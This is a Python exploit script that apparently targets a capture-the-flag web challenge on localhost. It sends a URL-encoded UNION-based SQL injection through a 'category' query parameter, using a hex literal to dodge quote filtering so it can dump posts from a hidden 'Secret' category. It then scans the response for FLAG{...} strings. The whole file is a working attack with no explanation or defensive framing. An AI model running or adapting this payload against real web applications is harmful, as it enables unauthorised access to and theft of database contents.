import requests, urllib.parse

# Target URL
base_url = "http://127.0.0.1:33130/"
endpoint = "?category="

# SQL injection payload using hex encoding for 'Secret'
# This will return all posts from the Secret category
payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"

# URL encode the payload
encoded_payload = urllib.parse.quote(payload, safe='')

# Construct full URL
full_url = f"{base_url}{endpoint}{encoded_payload}"

print(f"[*] Sending request to: {full_url}")
print(f"[*] Payload: {payload}")
print("-" * 80)

try:
    # Send request
    resp = requests.get(full_url, timeout=15)
    
    print(f"Status Code: {resp.status_code}")
    print(f"Content Length: {len(resp.text)} bytes")
    print("\n[*] Response Content:")
    print("-" * 80)
    print(resp.text)
    print("-" * 80)
    
    # Check if we found Secret posts
    if "Secret" in resp.text:
        print("\n[✓] SUCCESS! Found content with 'Secret' category")
    else:
        print("\n[-] No 'Secret' content found in response")
        
    # Check for flags
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"\n[!!!] FLAGS FOUND: {flags}")
    else:
        print("\n[-] No flags found")
        
except Exception as e:
    print(f"\n[!] Error: {e}")
    import traceback
    traceback.print_exc()
